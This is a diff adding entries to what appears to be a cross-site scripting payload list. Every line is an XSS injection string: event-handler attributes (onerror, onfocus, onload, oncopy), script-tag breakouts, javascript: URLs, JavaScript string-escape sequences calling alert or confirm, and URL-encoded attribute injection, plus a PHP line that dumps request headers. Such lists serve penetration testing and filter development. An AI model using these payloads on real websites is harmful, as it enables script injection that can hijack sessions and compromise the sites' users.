@@ -1,12 +1,17 @@
 test+onfouus='alert(0)'id='xss'
 "><img src onerror=alert(1)> = *DOM XSS
+«input»;p=\&q=-alert(1)//$result*var n = {a: "\", b: "-alert(1)}//"};
 Function`alert\`xss\````
+«input»;p=-alert(1)}//\$result*var n = {a: "-alert(1)}//\", b: "-alert(1)}//\"};
+"'`()[]\%; 
 "autofocus onfocus=alert(1)//
 </script><script>alert(1)</script>
 <link href=javascript:alert(1) accesskey=k> 
 <iframe src="javascript:alert(1)%%0D3C--
 -confirm`1`-”
 \”-confirm`1`//
+<x/oncopy=alert()>x
+<svg id=javascript:alert(10) onload=location=id>
 <tag handler=code>
 \”}})})-confirm`1`//
 \”}})})-confirm`1`/*/
@@ -17,6 +22,7 @@ Function`alert\`xss\````
 \”}})})-confirm`1`;({if(){/*///
 \”}})})-confirm`1`;({({if(){/*///
 \”}})})-confirm`1`;(function(){({if(){/*///
+testing%2522%80%2520accesskey='x'%2520onclick='confirm%601%60'
 \”}})})-confirm`1`(a=>{({b:{/*///
 <?=json_encode(getallheaders()).”\n”;
 <svg onload=write(1)>
